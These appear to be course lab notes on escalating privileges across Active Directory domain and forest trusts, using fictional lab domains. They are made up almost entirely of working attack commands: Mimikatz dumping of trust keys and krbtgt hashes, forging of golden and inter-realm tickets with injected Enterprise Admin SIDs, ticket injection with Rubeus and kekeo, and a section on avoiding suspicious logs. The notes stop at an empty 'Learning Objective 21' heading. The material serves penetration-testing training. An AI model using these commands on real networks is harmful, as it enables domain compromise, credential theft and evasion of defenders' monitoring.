# Across Trusts

• Across Domains - Implicit two way trust relationship. 
• Across Forests - Trust relationship needs to be established.

## Child to Parent

• Child to Forest Root 

• Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. 

• There are two ways of escalating privileges between two domains of same forest: 
– Krbtgt hash 
– Trust tickets

![[Pasted image 20230106220826.png]]

![[Pasted image 20230106220904.png]]

#### Get Trust Key from child to parent
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' - ComputerName dcorp-dc

# Or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

## Child to Forest root using Trust Tickets. 

#### Inter-realm TGT forging
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
```
![[Pasted image 20230106223817.png]]

#### Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
```powershell
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.

#### Use the TGS to access the targeted service (may need to use it twice). 
```powershell
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi 

ls \\mcorp-dc.moneycorp.local\c$

# With Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt 

ls \\mcorp-dc.moneycorp.local\c$
```

# Learning Objective 19

Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.

## Child to Parent Using krbtgt hash

#### Abuse SID history once again 
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
```

#### On any machine of the current domain 
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"' 

ls \\mcorp-dc.moneycorp.local.kirbi\c$ 

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local
```

#### Avoid suspicious logs
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631- 3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"' 

Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
```

• S-1-5-21-2578538781-2508153159-3419410681-516 -> Domain Controllers 
• S-1-5-9 -> Enterprise Domain Controllers

# Learning Objective 20

Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.

# Across Forests

![[Pasted image 20230106224942.png]]

#### Once again, we require the trust key for the inter-forest trust.
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' 
# Or 
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### An inter-forest TGT can be forged
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'
```

#### Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. 
```powershell
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

• Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.

#### Use the TGS to access the targeted service. 
```powershell
.\kirbikator.exe lsa .\CIFS.eurocorpdc.eurocorp.local.kirbi 

ls \\eurocorp-dc.eurocorp.local\forestshare\

# With Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorpdc.eurocorp.local /ptt 

ls \\eurocorp-dc.eurocorp.local\forestshare\
```

# Learning Objective 21

